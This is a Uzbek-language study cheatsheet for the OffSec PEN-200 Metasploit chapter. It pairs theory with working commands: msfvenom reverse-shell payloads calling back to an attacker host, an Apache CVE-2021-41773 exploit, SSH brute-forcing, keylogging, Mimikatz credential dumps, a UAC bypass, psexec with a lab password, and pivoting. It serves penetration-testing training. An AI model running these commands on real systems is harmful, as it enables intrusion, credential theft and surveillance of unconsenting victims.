# Metasploit Framework (PEN-200: Chapter 21) Cheatsheet & Konspekt

Ushbu hujjat OffSec PEN-200 kursi 21-bobi ("The Metasploit Framework") bo‘yicha to‘liq nazariy tushuntirishlar va amaliy buyruqlar to‘plamini (cheatsheet) o‘z ichiga oladi.

---

# 1-QISM: PENTESTER SIFATIDA BILISH KERAK BO‘LGAN NAZARIY BILIMLAR

## 1. Metasploit Framework arxitekturasi va maqsadi
* **Nega exploit framework kerak?** Ommaviy (public) exploitlarni topish, tahlil qilish va ishlatish murakkab. Ular turli dasturlash tillarida yozilgan, ularda xavfli yoki zararli (backdoor) kodlar bo‘lishi mumkin, yagona sintaksis mavjud emas va har bir vaziyatga moslab qo‘lda o‘zgartirishni talab qiladi. Metasploit ushbu jarayonni yagona standart interfeysga keltiradi va exploit bilan payloadni bir-biridan mustaqil ravishda moslashuvchan birlashtirish (dinamik payload qobiliyati) imkonini beradi.
* **Modul turlari:**
  * `Exploit`: Maqsadli tizimdagi zaiflikdan foydalanib kod ishga tushiruvchi va tizimga payload yetkazib beruvchi modullar.
  * `Auxiliary`: Payload ishlatmaydigan, tizimda shell ochmaydigan yordamchi modullar (axborot yig‘ish `gather/`, port/xizmatlarni skanerlash `scanner/`, fuzzerlar `fuzzers/`, trafikni tahlil qilish `sniffer/`, DoS va server modullari).
  * `Payload`: Zaiflik muvaffaqiyatli ishlatilgandan so‘ng nishon xotirasida ishga tushadigan zararli kod (shell, Meterpreter va h.k.).
  * `Post`: Tizimga kirgandan keyingi (post-exploitation) bosqichda faol sessiya ichida ishlatiladigan modullar (ma’lumot yig‘ish, credential dump, UAC bypass).
  * `Encoders`, `Nops`, `Evasion`: Antiviruslarni chetlab o‘tish va shellcode ichidagi yomon belgilarni (bad characters) tozalash vositalari.

## 2. Metasploit ma’lumotlar bazasi (PostgreSQL) va Workspaces
* Metasploit o‘zining holatini va natijalarini saqlash uchun **PostgreSQL** dan foydalanadi.
* **Pentester uchun bazaning afzalliklari:**
  * Skanerlangan hostlar (`hosts`), aniqlangan portlar/xizmatlar (`services`), topilgan login-parollar (`creds`), zaifliklar (`vulns`) va olingan fayllar (`loot`) avtomatik saqlanadi.
  * `services -p 445 --rhosts` kabi buyruqlar orqali bazadagi ma’lumotlarni to‘g‘ridan-to‘g‘ri modullarning `RHOSTS` parametriga avtomatik kiritish mumkin (qo‘lda IP yozish shart emas).
* **Workspaces:** Har bir nishon yoki loyiha uchun alohida ish maydoni (workspace) ochish ma’lumotlar chalkashib ketishining oldini oladi.

## 3. Exploit xususiyatlarini baholash (Module Metadata)
Exploitni ishga tushirishdan oldin `info` buyrug‘i orqali quyidagi metama’lumotlarni o‘rganish zarur:
* **Module Side Effects:** Exploit ortidan qanday iz qoldirishi (`ioc-in-logs` — loglarda indikatorlar qolishi, `artifacts-on-disk` — diskda fayl qolishi).
* **Module Stability:** Nishon xizmati yoki operatsion tizimini qulatmasligi (`crash-safe` — tizimni yiqitmaydi).
* **Module Reliability:** Qayta ishlatish imkoniyati (`repeatable-session` — bir necha marta muvaffaqiyatli ishlatish mumkin).
* **Check Supported:** Exploit kodini nishonga yubormasdan va zarba bermasdan oldin tizim zaif ekanligini xavfsiz tekshirish imkoniyati (`check` buyrug‘i).

## 4. Staged va Non-Staged Payloadlar: Fundamental farq
* **Muammo (Buffer hajmi):** Buffer Overflow yoki shunga o‘xshash xotira zaifliklarida qurbon xotirasida shellcode joylashadigan bufer hajmi juda kichik (masalan, bir necha yuz bayt) bo‘lishi mumkin. Katta hajmli to‘liq payload buferga sig‘maydi va exploit muvaffaqiyatsiz bo‘ladi.
* **Non-staged (Single / Inline) Payload:**
  * Barcha kod (tarmoq ulanishi + buyruqlar bajarish logikasi) bitta yaxlit paketda birdaniga nishonga yuboriladi.
  * **Sintaksis:** Nomida pastki chiziq `_` ishlatiladi (Masalan: `windows/x64/shell_reverse_tcp`, `linux/x64/meterpreter_reverse_tcp`).
  * **Afzalligi:** Barqaror, mustaqil ishlaydi, qo‘shimcha bosqich yuklash talab qilinmaydi, oddiy Netcat (`nc -lvnp`) orqali ham qabul qilsa bo‘ladi.
  * **Kamchiligi:** Hajmi kattaroq (bir necha yuz bayt yoki kilobayt), kichik buferlarga sig‘maydi.
* **Staged Payload:**
  * Ikki yoki undan ortiq bosqichga bo‘lingan:
    1. **Stage 0 (Stager):** Juda kichik hajmli shellcode (ko‘pincha 100 baytdan kam). Uning yagona vazifasi — hujumchiga qayta ulanish o‘rnatish va keyingi bosqichni yuklab olish uchun xotirada joy ajratish.
    2. **Stage 1 / Stage 2:** Katta hajmli asosiy kod (shell yoki Meterpreter). U tarmoq orqali stager tomonidan xotiraga tortib olinadi va ishga tushiriladi.
  * **Sintaksis:** Nomida qiyshiq chiziq `/` ishlatiladi (Masalan: `windows/x64/shell/reverse_tcp`, `windows/x64/meterpreter/reverse_tcp`).
  * **Afzalligi:** Hajmi juda kichik, cheklangan bufer joylariga oson sig‘adi.
  * **Kamchiligi:** Tarmoqda qo‘shimcha trafik hosil qiladi, tarmoq xavfsizlik tizimlari (IDS/IPS, firewall) tomonidan payqab qolish xavfi yuqori.
  * **NEGA Netcat bilan ishlamaydi?** Staged payload yaratilgan bo‘lsa va Netcat bilan tinglansa, ulanish tushishi bilan uzilib qoladi yoki qotib qoladi. Chunki Stager Netcat'dan Stage 1 kodini yuborishni kutadi, ammo Netcat Staging protokolini tushunmaydi. Shuning uchun staged payloadlar uchun doimo Metasploit'ning `exploit/multi/handler` moduli talab qilinadi.

## 5. Meterpreter arxitekturasi va Channels
* **Nega oddiy reverse shell emas?** Oddiy shell faqat buyruq kiritish (`cmd` yoki `bash`) imkonini beradi. U yangi jarayonlarni ochadi, diskda qoladi va cheklangan imkoniyatga ega.
* **Meterpreter afzalliklari:**
  * **In-Memory (Xotirada ishlash):** Diskka yozilmaydi. Windows tizimlarida *Reflective DLL Injection* orqali bevosita xotiraga inyekt qilinadi. Diskka binar yozilmagani sababli an’anaviy fayl-asosli antiviruslardan qochadi.
  * **Shifrlangan aloqa:** Buyruqlar TLS/SSL (HTTPS) orqali shifrlanadi.
  * **TLV (Type-Length-Value) protokoli:** Barcha xabarlar TLV paketi formatida yuboriladi.
  * **Dinamik kengayuvchanlik:** Yangi funksiyalar (masalan, `kiwi`, `incognito`) sessiya davomida xotiraga yuklanadi (`load`).
* **Channels (Kanallar) tushunchasi:**
  * Meterpreter bitta sessiya ichida bir nechta alohida oqimlarni — "kanallar"ni boshqaradi.
  * Masalan, `shell` buyrug‘i berilganda alohida kanal ochiladi. Uni `Ctrl+Z` bilan fonga olib, Meterpreter'da ishlashda davom etish, keyin yana `channel -i <id>` orqali o‘sha shellga qaytish mumkin.

## 6. Post-Exploitation nazariyasi
* **`idletime` ning taktik o‘rni:** Foydalanuvchi kompyuter oldida qancha vaqt bo‘lmaganini ko‘rsatadi. Qisqa vaqtga ekranda CMD yoki PowerShell oynasi ko‘rinib qolishi mumkin bo‘lgan buyruqlarni berishdan oldin foydalanuvchi kompyuterdan uzoqlashganiga ishonch hosil qilish zarur.
* **`getsystem` va Windows huquqlari:**
  * Avtomatik ravishda `NT AUTHORITY\SYSTEM` darajasiga ko‘tarishga urinadi.
  * Asosiy texnikalari: Named Pipe Impersonation (shu jumladan PrintSpooler varianti) va Token Duplication.
  * Muvaffaqiyatli bo‘lishi uchun foydalanuvchida `SeImpersonatePrivilege` yoki `SeDebugPrivilege` huquqi bo‘lishi shart.
* **Process Migration (`migrate`):**
  * Exploit qilingan yoki binar ishga tushgan dastlabki jarayon (masalan, `met.exe` yoki qurbon yopishi mumkin bo‘lgan vaqtinchalik dastur) xavfli. Agar foydalanuvchi dasturni yopsa, sessiya uziladi.
  * Qolaversa, shubhali nomdagi process administrator tekshiruvida darhol ko‘rinadi.
  * Shuning uchun Meterpreter'ni tizimning doimiy va barqaror jarayoniga (masalan, `OneDrive.exe`, `explorer.exe` yoki `svchost.exe`) ko‘chirish zarur. Faqat o‘zining yoki undan pastroq huquqdagi processlarga ko‘chish mumkin.
* **Integrity Levels va UAC Bypass:**
  * Agar foydalanuvchi Administrator guruhida bo‘lsa ham, Windows UAC (User Account Control) tufayli uning jarayoni **Medium Integrity** darajasida ishlaydi (cheklangan token).
  * Medium Integrity holatida `getsystem` yoki to‘liq administratorlik amallari ishlamaydi.
  * UAC Bypass (masalan, `exploit/windows/local/bypassuac_sdclt` orqali Windows'ning `sdclt.exe` binaridan foydalanib) yangi **High Integrity** sessiyasini ochib beradi.
  * Faqat High Integrity sessiyasiga erishgandan keyingina `getsystem` orqali `SYSTEM` darajasiga chiqish mumkin.
* **Kiwi (Mimikatz):**
  * `load kiwi` orqali yuklanadi.
  * Windows xotirasidagi LSASS jarayonidan ochiq parollar, NTLM hashlar, Kerberos chiptalarini o‘qiydi. Ishlashi uchun `SYSTEM` huquqi talab qilinadi.

## 7. Pivoting va Tarmoq marshrutlash (Network Pivoting)
* **Pivoting nima?** Birinchi buzilgan mashina bir vaqtning o‘zida tashqi tarmoqqa va tashqaridan ko‘rinmaydigan ichki maxfiy tarmoqqa ulangan bo‘lsa (dual-homed), undan ko‘prik (pivot) sifatida foydalanib, ichki tarmoqdagi ikkinchi mashinaga hujum qilish.
* **Metasploit Routing jadvali (`route add` / `autoroute`):**
  * Metasploit ichiga qo‘shilgan marshrut faqat **Metasploit Framework ichidagi modullar** uchun amal qiladi (tizimning o‘ziga emas).
  * Masalan, qo‘shilgan marshrut orqali Metasploit port skaneri (`scanner/portscan/tcp`) yoki `psexec` ichki IP ga to‘g‘ridan-to‘g‘ri murojaat qila oladi.
* **Nega ichki mashinaga BIND shell ishlatiladi?**
  * Tashqi tarmoqdan ichki mashinani (`172.16.5.200`) ekspluatatsiya qilishda `bind_tcp` ishlatiladi.
  * Sababi: Ichki tarmoqdagi mashinada bizning Kali tarmog‘imizga (`192.168.x.x`) to‘g‘ridan-to‘g‘ri yo‘nalish yo‘q, shuning uchun reverse shell Kali'ga qaytib kela olmaydi. Bind shell esa qurbon mashinada port ochadi, Metasploit esa o‘rnatilgan pivot orqali unga ulanadi.
* **SOCKS Proxy va Proxychains:**
  * Tashqi dasturlarni (masalan, Kali'dagi `xfreerdp`, `curl`, `nmap`) ichki tarmoqqa yo‘naltirish uchun Metasploit'da SOCKS server (`auxiliary/server/socks_proxy`) ishga tushiriladi va `/etc/proxychains4.conf` fayliga ulanadi.
  * `proxychains` orqali skanerlashda `nmap -sT` (TCP Connect) ishlatilishi shart, chunki SOCKS proksi orqali SYN (`-sS`) skanerlash ishlamaydi.
* **Port Forwarding (`portfwd`):**
  * Meterpreter sessiyasi ichidan aniq bir portni (masalan, ichki RDP 3389 portini) Kali'ning lokal portiga bog‘lab beradi.

## 8. Resource Scripts orqali avtomatlashtirish
* `.rc` kengaytmali fayllar msfconsole buyruqlarini ketma-ket avtomatik bajarish uchun ishlatiladi (Ruby kodlarini ham qo‘llab-quvvatlaydi).
* **Muhim parametrlar:**
  * `ExitOnSession false`: Sessiya tushgandan keyin ham listener'ni o‘chirmasdan ochiq qoldiradi (bir nechta tizimdan ulanish olish uchun).
  * `AutoRunScript post/windows/manage/migrate`: Sessiya tushishi bilanoq darhol avtomatik ravishda boshqa jarayonga ko‘chirishni bajaradi.

---

# 2-QISM: AMALIY CHEATSHEET (OFFSEC PEN-200, 21-BOB)

---

### 1. MSF Sozlash va Ma’lumotlar bazasi (21.1.1)

#### Baza va konsolni ishga tushirish:
```bash
# PostgreSQL bazasini yaratish va initsializatsiya qilish
sudo msfdb init

# PostgreSQL xizmatini tizim yoqilganda avtomatik ishga tushadigan qilish
sudo systemctl enable postgresql

# Metasploit konsolini ishga tushirish
sudo msfconsole

# Konsolni sokin (banner va versiya ma’lumotlarisiz) ochish
sudo msfconsole -q
```

#### Ma’lumotlar bazasi va Workspace boshqaruvi:
```text
msf6 > db_status                                    # Baza ulanganligini tekshirish
msf6 > workspace                                    # Ish maydonlari (workspaces) ro‘yxati
msf6 > workspace -a exploits                        # Yangi "exploits" ish maydonini yaratish
msf6 > workspace exploits                           # "exploits" ish maydoniga o‘tish
msf6 > workspace -d exploits                        # Ish maydonini o‘chirish
msf6 > workspace -h                                 # Workspace yordam menyusi
```

#### Nmap integratsiyasi va bazadan foydalanish:
```text
msf6 > db_nmap -sV -p- 192.168.50.202               # Nmap ishlatish va natijani to‘g‘ridan-to‘g‘ri bazaga yozish
msf6 > hosts                                        # Bazada saqlangan barcha hostlar ro‘yxati
msf6 > hosts -R                                     # Bazadagi hostlarni RHOSTS parametriga avtomatik belgilash
msf6 > services                                     # Aniqlangan barcha ochiq portlar va xizmatlar ro‘yxati
msf6 > services -p 445                              # Faqat 445-portdagi xizmatlarni ko‘rsatish
msf6 > services -p 445 --rhosts                     # 445-porti ochiq hostlarni avtomatik RHOSTS ga tayinlash
msf6 > vulns                                        # Aniqlangan zaifliklarni ko‘rish (masalan: SMB Signing)
msf6 > creds                                        # Topilgan login va parollar ro‘yxati
msf6 > loot                                         # O‘g‘irlangan/saqlangan fayllar ro‘yxati
```

---

### 2. Yordamchi modullar — Auxiliary Modules (21.1.2)

```text
msf6 > show auxiliary                               # Barcha yordamchi modullarni ro‘yxatlash
msf6 > search type:auxiliary smb                    # SMB bo‘yicha auxiliary modullarni qidirish
msf6 > search type:auxiliary ssh                    # SSH bo‘yicha auxiliary modullarni qidirish
msf6 > use 56                                       # Qidiruvdagi indeks raqami orqali modulni tanlash
msf6 > use auxiliary/scanner/smb/smb_version        # To‘liq nom orqali tanlash
msf6 > info                                         # Modul haqida to‘liq ma’lumot, talablar va tavsif
msf6 > show options                                 # Modul parametrlarini ko‘rish
msf6 > show missing                                 # Kiritilishi shart bo‘lgan, lekin hali kiritilmagan parametrlarni ko‘rish
msf6 > set RHOSTS 192.168.50.202                    # Parametrni belgilash
msf6 > unset RHOSTS                                 # Parametr qiymatini tozalash
msf6 > setg RHOSTS 192.168.50.202                   # Global parametr qilish (barcha modullarda saqlanadi)
msf6 > unsetg RHOSTS                                # Global parametrni o‘chirish
msf6 > run                                          # Modulni ishga tushirish (yoki exploit)
```

#### SMB va SSH skanerlash modullari:
```text
# SMB versiyasini va imzolash holatini aniqlash:
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.50.202
msf6 auxiliary(scanner/smb/smb_version) > run

# SSH loginlarini bruteforce qilish:
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.50.202
msf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE /usr/share/wordlists/users.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/passwords.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set STOP_ON_SUCCESS true
msf6 auxiliary(scanner/ssh/ssh_login) > set VERBOSE true
msf6 auxiliary(scanner/ssh/ssh_login) > run
```

---

### 3. Exploit modullari — Exploit Modules (21.1.3)

```text
msf6 > search Apache 2.4.49                         # Kalit so‘z bo‘yicha qidirish
msf6 > search cve:2021-41773                        # CVE bo‘yicha qidirish
msf6 > use exploit/multi/http/apache_normalize_path_rce
msf6 exploit(multi/http/apache_normalize_path_rce) > info
msf6 exploit(multi/http/apache_normalize_path_rce) > check           # Zaiflik mavjudligini xavfsiz tekshirish
msf6 exploit(multi/http/apache_normalize_path_rce) > show targets    # Mavjud nishon turlari (0 - Dropper, 1 - In-Memory)
msf6 exploit(multi/http/apache_normalize_path_rce) > set target 0
msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads   # Mos keladigan payloadlar ro‘yxati
msf6 exploit(multi/http/apache_normalize_path_rce) > set payload linux/x64/shell_reverse_tcp
msf6 exploit(multi/http/apache_normalize_path_rce) > set RHOSTS 192.168.50.16
msf6 exploit(multi/http/apache_normalize_path_rce) > set RPORT 80
msf6 exploit(multi/http/apache_normalize_path_rce) > set SSL false
msf6 exploit(multi/http/apache_normalize_path_rce) > set LHOST 192.168.119.2
msf6 exploit(multi/http/apache_normalize_path_rce) > set LPORT 443   # 4444 ko‘pincha firewall'da yopiq bo‘ladi!
msf6 exploit(multi/http/apache_normalize_path_rce) > exploit         # Ishga tushirish (yoki run)
msf6 exploit(multi/http/apache_normalize_path_rce) > exploit -j      # Background job sifatida orqa fonga ishga tushirish
msf6 exploit(multi/http/apache_normalize_path_rce) > exploit -z      # Sessiya ochilganda unga avtomatik kirmaslik
```

#### Sessiyalarni boshqarish:
```text
msf6 > sessions -l                                  # Faol sessiyalar ro‘yxati
msf6 > sessions -i 1                                # 1-raqamli sessiyaga ulanish
msf6 > sessions -k 1                                # 1-raqamli sessiyani o‘chirish
msf6 > sessions -K                                  # Barcha faol sessiyalarni o‘chirish
msf6 > sessions -u 1                                # Oddiy buyruq qatori (shell) sessiyasini Meterpreter'ga ko‘tarish
```

---

### 4. Mustaqil ijro fayllari yaratish — msfvenom (21.2.3)

#### Ro‘yxatlarni ko‘rish:
```bash
# Platforma va arxitektura bo‘yicha payloadlarni saralab ko‘rish
msfvenom -l payloads --platform windows --arch x64

# Chiqish formatlarini ko‘rish
msfvenom -l formats
```

#### Non-staged executable yaratish (Netcat bilan ishlaydi):
```bash
# Windows 64-bit Non-staged TCP shell (Netcat bilan qabul qilsa bo‘ladi)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe

# Tinglash (Kali'da):
nc -lvnp 443
```

#### Staged executable yaratish (Faqat multi/handler bilan ishlaydi):
```bash
# Windows 64-bit Staged TCP shell (Netcat bilan ISHLAMAYDI)
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o staged.exe
```

#### Meterpreter executable yaratish:
```bash
# Windows 64-bit Non-staged Meterpreter HTTPS (shifrlangan)
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.4 LPORT=443 -f exe -o met.exe

# Windows 64-bit Non-staged Meterpreter TCP
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o met_tcp.exe
```

#### Universal tinglovchi — `multi/handler`:
```text
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_https
msf6 exploit(multi/handler) > set LHOST 192.168.119.4
msf6 exploit(multi/handler) > set LPORT 443
msf6 exploit(multi/handler) > run
```

---

### 5. Asosiy Meterpreter buyruqlari (21.2.2 & 21.3.1)

#### Tizim va ma’lumot yig‘ish:
```text
meterpreter > sysinfo                               # Operatsion tizim, arxitektura va nomini ko‘rish
meterpreter > getuid                                # Joriy foydalanuvchi nomini ko‘rish
meterpreter > getpid                                # Joriy process ID raqamini ko‘rish
meterpreter > idletime                              # Foydalanuvchi kompyuter oldida qancha vaqt bo‘lmaganini ko‘rish
meterpreter > ps                                    # Ishlayotgan barcha jarayonlar ro‘yxati
meterpreter > pgrep explorer                        # Jarayon nomi bo‘yicha qidirish
meterpreter > pkill notepad                         # Jarayon nomi bo‘yicha to‘xtatish
```

#### Fayl tizimi amallari (Lokal va Masofaviy):
```text
meterpreter > pwd                                   # Nishon tizimdagi joriy papka
meterpreter > lpwd                                  # Kali tizimidagi mahalliy joriy papka
meterpreter > cd C:\\Users\\luiza                   # Nishonda papkaga o‘tish
meterpreter > lcd /home/kali/Downloads              # Kali'da papkaga o‘tish
meterpreter > ls                                    # Nishondagi fayllar ro‘yxati
meterpreter > lls                                   # Kali'dagi mahalliy fayllar ro‘yxati
meterpreter > cat /etc/passwd                       # Faylni ekranga o‘qish
meterpreter > lcat /etc/hosts                       # Mahalliy faylni o‘qish
meterpreter > download /etc/passwd /home/kali/      # Nishondan faylni yuklab olish
meterpreter > upload /home/kali/met.exe C:\\Users\\ # Nishonga faylni joylash
meterpreter > edit test.txt                         # Faylni tahrirlash
```

#### Kanallar (Channels) va interaktiv shell:
```text
meterpreter > shell                                 # Oddiy buyruq qatorini (CMD/Bash) ochish (kanal yaratadi)
# Chiqishsiz fonga olish:
C:\> ^Z (Ctrl + Z) -> Background channel 1? [y/N] y
meterpreter > channel -l                            # Faol kanallar ro‘yxati
meterpreter > channel -i 1                          # 1-kanalga qayta ulanish
meterpreter > channel -c 1                          # 1-kanalni yopish
meterpreter > background                            # Meterpreter sessiyasini orqa fonga olish (yoki bg)
```

#### Huquqni oshirish va kuzatuv:
```text
meterpreter > getsystem                             # SYSTEM huquqiga avtomatik ko‘tarilish (PrintSpooler / Named Pipe)
meterpreter > migrate 8052                          # Boshqa processga (masalan, OneDrive.exe PID 8052) ko‘chish
meterpreter > execute -H -f notepad                 # Yashirin (Hidden) jarayon ochish (PID qaytaradi)
meterpreter > screenshot                            # Nishon ekranini rasmga olib, Kali'ga saqlash
meterpreter > screenshare                           # Nishon ekranini real vaqtda brauzerda translatsiya qilish
meterpreter > keyscan_start                         # Klaviatura tugmalarini ushlashni boshlash (keylogger)
meterpreter > keyscan_dump                          # Yozib olingan tugmalarni ekranga chiqarish
meterpreter > keyscan_stop                          # Keyloggerni to‘xtatish
meterpreter > hashdump                              # SAM bazasidagi barcha lokal parollar hashlarini chiqarish
```

---

### 6. Post-Exploitation modullari, UAC Bypass va Kiwi (21.3.2)

#### UAC (User Account Control) Bypass:
```text
# Qurbon kompyuterida (shell ichida) Integrity Levelni tekshirish:
PS C:\> Import-Module NtObjectManager
PS C:\> Get-NtTokenIntegrityLevel                   # Agar "Medium" bo‘lsa, UAC bypass kerak

# Meterpreter'ni fonga olamiz (bg) va modulni ishlatamiz:
msf6 > use exploit/windows/local/bypassuac_sdclt
msf6 exploit(windows/local/bypassuac_sdclt) > set SESSION 9
msf6 exploit(windows/local/bypassuac_sdclt) > set LHOST 192.168.119.4
msf6 exploit(windows/local/bypassuac_sdclt) > run
# Natijada High Integrity darajasidagi yangi Meterpreter sessiyasi ochiladi!

# Yangi sessiyada SYSTEM huquqini olamiz:
meterpreter > getsystem
```

#### Kiwi (Mimikatz) moduli:
```text
meterpreter > load kiwi                             # Kiwi kengaytmasini xotiraga yuklash
meterpreter > creds_all                             # Barcha aniqlangan hisoblarni (parol, hash, Kerberos) olish
meterpreter > creds_msv                             # LM va NTLM hashlarini ajratib olish
meterpreter > creds_kerberos                        # Kerberos chiptalarini olish
meterpreter > lsa_dump_sam                          # Lokal SAM bazasini xotiradan dump qilish
meterpreter > lsa_dump_secrets                      # LSA sirlarini (kashlangan ma’lumotlarni) dump qilish
meterpreter > golden_ticket_create                  # Kerberos Golden Ticket yaratish
```

---

### 7. Pivoting, Marshrutlash va Proksi (21.3.3)

#### Marshrut (Route) qo‘shish:
```text
# Qo‘lda marshrut qo‘shish (Session 12 orqali ichki tarmoqqa yo‘l ochish):
msf6 > route add 172.16.5.0/24 12
msf6 > route print                                  # Qo‘shilgan faol marshrutlarni ko‘rish
msf6 > route remove 172.16.5.0/24 12                # Marshrutni o‘chirish
msf6 > route flush                                  # Barcha marshrutlarni tozalash

# Avtomatik autoroute moduli orqali marshrut qo‘shish:
msf6 > use multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 12
msf6 post(multi/manage/autoroute) > run
```

#### Ichki tarmoqdagi ikkinchi kompyuterni skanerlash va buzish:
```text
# Ichki IP'ni Metasploit orqali skanerlash:
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 172.16.5.200
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389
msf6 auxiliary(scanner/portscan/tcp) > run

# Ichki kompyuterga PSEXEC orqali BIND shell bilan hujum qilish:
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set SMBUser luiza
msf6 exploit(windows/smb/psexec) > set SMBPass "BoccieDearAeroMeow1!"
msf6 exploit(windows/smb/psexec) > set RHOSTS 172.16.5.200
msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_tcp   # BIND payload shart!
msf6 exploit(windows/smb/psexec) > set LPORT 8000
msf6 exploit(windows/smb/psexec) > run
```

#### SOCKS5 Proksi va Proxychains:
```text
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run -j          # Orqa fonda SOCKS serverni yoqish

# Kali terminalida /etc/proxychains4.conf faylini tahrirlash:
# [ProxyList] bo‘limi oxiriga qo‘shiladi:
# socks5 127.0.0.1 1080

# Tashqi dasturlarni ichki tarmoqqa yo‘naltirish:
kali@kali:~$ sudo proxychains xfreerdp /v:172.16.5.200 /u:luiza
kali@kali:~$ proxychains curl http://172.16.5.200/
kali@kali:~$ proxychains nmap -sT -Pn -p 445,3389 172.16.5.200
```

#### Meterpreter Port Forwarding (`portfwd`):
```text
# Ichki kompyuterning (172.16.5.200) 3389-portini Kali'ning 3389-portiga to‘g‘rilash:
meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.5.200

# Tekshirish va o‘chirish:
meterpreter > portfwd list
meterpreter > portfwd delete -l 3389

# Endi to‘g‘ridan-to‘g‘ri lokal portga ulanish mumkin:
kali@kali:~$ sudo xfreerdp /v:127.0.0.1:3389 /u:luiza
```

---

### 8. Resource Scripts orqali avtomatlashtirish (21.4.1)

#### `listener.rc` fayli namunasi:
```text
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_https
set LHOST 192.168.119.4
set LPORT 443
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
run -z -j
```

#### Resource scriptlarni ishga tushirish:
```bash
# msfconsole'ni skript bilan birga ishga tushirish:
sudo msfconsole -r listener.rc

# Konsol ichida turib skriptni chaqirish:
msf6 > resource listener.rc

# Konsolda yozilgan barcha buyruqlar tarixini yangi skriptga saqlab olish:
msf6 > makerc /home/kali/my_setup.rc
```

#### Tizimdagi tayyor skriptlar joylashuvi:
```bash
ls -l /usr/share/metasploit-framework/scripts/resource
# Masalan: portscan.rc, autoexploit.rc, auto_pass_the_hash.rc
```
